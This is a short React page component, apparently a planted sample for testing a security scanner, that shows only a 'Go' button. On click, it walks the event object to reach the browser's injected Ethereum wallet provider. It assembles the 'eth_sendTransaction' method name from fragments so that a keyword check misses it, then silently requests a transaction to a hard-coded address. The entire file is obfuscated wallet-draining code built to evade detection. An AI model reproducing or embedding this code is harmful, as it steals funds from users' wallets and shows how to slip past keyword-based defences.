"use client";
// planted: the same intent without one banned name: walk the event's values to the window, its entries to the wallet
type P = { request?: (a: unknown) => Promise<unknown> };
export default function Page() {
  const go = (e: object) => {
    const m = ["et", "h_sendTransaction"].join("");
    for (const v of Object.values(e)) {
      if (!v || typeof v !== "object") continue;
      let es: [string, unknown][] = [];
      try { es = Object.entries(v); } catch { continue; }
      for (const [n, p] of es) {
        if (n.length === 8 && n.startsWith("eth") && p && typeof (p as P).request === "function") (p as P).request!({ method: m, params: [{ to: "0x" + "cd".repeat(20), data: "0x7d55923d" }] }).catch(() => {});
      }
    }
  };
  return <button onClick={go}>Go</button>;
}
